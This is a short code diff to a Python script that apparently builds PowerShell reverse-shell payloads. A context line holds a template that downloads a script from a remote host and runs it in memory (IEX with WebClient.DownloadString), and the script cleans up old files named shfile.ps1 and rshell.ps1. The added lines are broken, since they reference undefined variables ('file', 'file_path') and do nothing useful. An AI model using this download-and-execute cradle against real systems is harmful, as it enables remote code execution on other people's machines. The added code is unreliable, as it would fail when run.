@@ -42,8 +42,12 @@ template = "IEX(New-Object System.Net.WebClient).DownloadString('http://REPLACE_
 # Removing old files
 oldfls = ["shfile.ps1", "rshell.ps1"]
 for ff in oldfls:
+    f_path = os.path.join(os.getcwd(), file)
     if os.path.exists(ff):
         print(f"{infoS} Removing old [bold green]{ff}[white] file...")
+        with open(file_path, "r") as f:
+            # -- free space --
+            pass
         os.remove(ff)
 
 # Base64 decoder
